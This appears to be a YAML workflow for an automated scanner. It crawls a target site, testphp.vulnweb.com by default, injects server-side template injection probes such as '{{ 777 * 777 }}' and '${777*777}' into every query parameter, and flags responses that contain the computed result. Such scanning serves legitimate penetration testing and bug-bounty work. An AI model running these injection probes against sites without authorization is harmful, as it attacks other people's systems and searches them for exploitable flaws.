description: It searches whole website in order to find parameters which can cause Server Side Tamplate Injection (SSTI).
tags: SSTI
params: target=testphp.vulnweb.com
env:
  - HOME: /root/
  - LOG_DIR: ${HOME}/logs
  - PATH: /usr/local/bin:${PATH}
steps:
  - name: CustomSSTI1
    command: bash
    script: |
      gau ${target//\"} | gf ssti | qsreplace "{{ 777 * 777 }}" | ~/go/bin/httpx -silent -mr "603729"

  - name: CustomSSTI2
    command: bash
    script: |
      ~/go/bin/httpx -u ${target//\"} | katana qurl | qsreplace "{{ 777 * 777 }}" | ~/go/bin/httpx -silent -mr "603729" 
  - name: CustomSSTI3
    command: bash
    script: |
      ~/go/bin/httpx -u ${target//\"} | katana qurl | qsreplace "<%= 777 * 777 %>" | ~/go/bin/httpx -silent -mr "603729" 
  - name: CustomSSTI4
    command: bash
    script: |
      ~/go/bin/httpx -u ${target//\"} | katana qurl | qsreplace "${{777*777}}" | ~/go/bin/httpx -silent -mr "603729" 
  - name: CustomSSTI5
    command: bash
    script: |
      ~/go/bin/httpx -u ${target//\"} | katana qurl | qsreplace "@(777*777)" | ~/go/bin/httpx -silent -mr "603729" 
  - name: CustomSSTI6
    command: bash
    script: |
      ~/go/bin/httpx -u ${target//\"} | katana qurl | qsreplace "${777*777}" | ~/go/bin/httpx -silent -mr "603729" 
  - name: CustomSSTI7
    command: bash
    script: |
      ~/go/bin/httpx -u ${target//\"} | katana qurl | qsreplace "#{ 777 * 777 }" | ~/go/bin/httpx -silent -mr "603729" 

      